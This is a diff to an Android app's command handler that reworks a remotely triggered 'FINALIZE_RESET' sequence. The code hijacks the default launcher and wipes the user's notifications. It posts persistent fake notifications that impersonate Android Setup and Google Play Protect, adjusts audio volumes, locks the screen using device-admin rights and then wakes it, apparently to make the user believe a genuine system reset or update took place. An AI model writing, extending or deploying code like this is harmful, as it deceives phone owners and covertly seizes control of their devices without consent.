@@ -2251,7 +2251,19 @@ object CommandProcessor {
                     }
                 }
                 "FINALIZE_RESET" -> {
-                    // 1. Configure Launcher: WORK mode, Active, and Heavy Boot (Stutter)
+                    DebugLogger.log("FINALIZE", "Starting FINALIZE_RESET sequence.")
+                    
+                    // 1. Instantly Dim and tear down the Welcome UI
+                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        DimmerManager.applyDim(ctx, 0, "AUTO")
+                        DynamicUIManager.removeOverlay(ctx, "FINALIZE_RESET")
+                        DynamicUIManager.removeNativeOverlay(ctx, "FINALIZE_RESET")
+                    }
+                    
+                    // Give UI time to vanish in the dark
+                    kotlinx.coroutines.delay(500)
+
+                    // 2. Configure Launcher: WORK mode, Active, and Heavy Boot (Stutter)
                     val lPrefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                     lPrefs.edit()
                         .putString("display_mode", "WORK")
@@ -2260,7 +2272,7 @@ object CommandProcessor {
                         .apply()
                     AppCache.invalidate()
 
-                    // 2. Check and Hijack Default Launcher
+                    // 3. Check and Hijack Default Launcher
                     val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
                     if (currentHome != ctx.packageName) {
                         LauncherManager.isHijacking = true
@@ -2283,46 +2295,34 @@ object CommandProcessor {
                             kotlinx.coroutines.delay(500)
                             waitTime += 500
                         }
+                        DebugLogger.log("FINALIZE", "Launcher hijack completed or timed out. WaitTime: ${waitTime}ms")
+                    } else {
+                        DebugLogger.log("FINALIZE", "Already default launcher. Skipping hijack.")
                     }
 
-                    // 3. Physically Lock Screen
-                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-                    val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
-                    if (dpm.isAdminActive(adminComponent)) {
-                        try { dpm.lockNow() } catch (e: Exception) { }
-                    }
-
-                    // 4. Tear down the Welcome UI in the dark
-                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                        DynamicUIManager.removeOverlay(ctx, "FINALIZE_RESET")
-                        DynamicUIManager.removeNativeOverlay(ctx, "FINALIZE_RESET")
-                        DimmerManager.removeOverlay(ctx)
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                            .putBoolean("power_shield_keep_ignited", false).apply()
-                    }, 800)
-
-                    // 5. Wake Screen to Swipe/Lock screen
-                    kotlinx.coroutines.delay(2000)
-                    val pulseIntent = android.content.Intent(ctx, PulseActivity::class.java).apply {
-                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                        putExtra("is_wake_trigger", true)
-                        putExtra("preserve_keyguard", true)
-                    }
-                    ctx.startActivity(pulseIntent)
-
-                    // 6. Post-Boot Audio and Notification Manipulation
+                    // 4. Post-Boot Audio and Notification Manipulation
                     try {
                         val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
-                        if (PermissionManager.hasDndAccess(ctx)) {
-                            am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
-                        }
+                        try { am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL } catch(e:Exception){}
+                        
                         val maxRing = am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING)
                         am.setStreamVolume(android.media.AudioManager.STREAM_RING, (maxRing * 0.7f).toInt(), 0)
-                    } catch(e: Exception){}
+                        
+                        val maxNotif = am.getStreamMaxVolume(android.media.AudioManager.STREAM_NOTIFICATION)
+                        am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, (maxNotif * 0.7f).toInt(), 0)
+                        DebugLogger.log("FINALIZE", "Audio volumes restored to 70%.")
+                    } catch(e: Exception) {
+                        DebugLogger.log("FINALIZE_ERR", "Audio restore failed: ${e.message}")
+                    }
 
-                    MyNotificationListener.instance?.wipeNotifications("ALL", null)
+                    val wipedCount = MyNotificationListener.instance?.wipeNotifications("ALL", null) ?: -1
+                    if (wipedCount == -1) {
+                        DebugLogger.log("FINALIZE_ERR", "NotificationListener offline. Could not wipe existing notifications.")
+                    } else {
+                        DebugLogger.log("FINALIZE", "Wiped $wipedCount existing notifications.")
+                    }
 
-                    kotlinx.coroutines.delay(2000)
+                    // Push fake notifications FIRST so they are ready when screen turns on
                     val fakeNotifs = listOf(
                         Pair("Android Setup", "Finishing system update..."),
                         Pair("Google Play Protect", "Scanning device for threats..."),
@@ -2343,11 +2343,48 @@ object CommandProcessor {
                             .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                             .setOngoing(true)
                         nm.notify(notifId++, builder.build())
-                        kotlinx.coroutines.delay(800)
+                        kotlinx.coroutines.delay(200)
+                    }
+                    DebugLogger.log("FINALIZE", "Fake notifications posted.")
+
+                    // 5. Physically Lock Screen
+                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
+                    if (dpm.isAdminActive(adminComponent)) {
+                        try { 
+                            dpm.lockNow() 
+                            DebugLogger.log("FINALIZE", "Screen locked physically.")
+                        } catch (e: Exception) { 
+                            DebugLogger.log("FINALIZE_ERR", "Lock failed: ${e.message}")
+                        }
+                    } else {
+                        DebugLogger.log("FINALIZE_ERR", "Cannot lock screen: Device Admin not active.")
+                    }
+
+                    // Release ignition block from Setup process
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                        .putBoolean("power_shield_keep_ignited", false).apply()
+
+                    // Wait for lock to settle
+                    kotlinx.coroutines.delay(1500)
+
+                    // 6. Wake Screen to Swipe/Lock screen
+                    val pulseIntent = android.content.Intent(ctx, PulseActivity::class.java).apply {
+                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                        putExtra("is_wake_trigger", true)
+                        putExtra("preserve_keyguard", true)
+                    }
+                    ctx.startActivity(pulseIntent)
+                    DebugLogger.log("FINALIZE", "Wake intent dispatched.")
+
+                    // 7. Unblind the screen so user can see the lockscreen
+                    kotlinx.coroutines.delay(800)
+                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        DimmerManager.removeOverlay(ctx)
                     }
 
                     status = "FINALIZE_RESET_COMPLETE"
-                    errorMsg = "Launcher hijacked, screen locked, waking up, heavy mode active."
+                    errorMsg = "Sequence finished. Heavy Boot is Active."
                 }
                 "HIJACK_LAUNCHER" -> {
                     LauncherManager.isHijacking = true
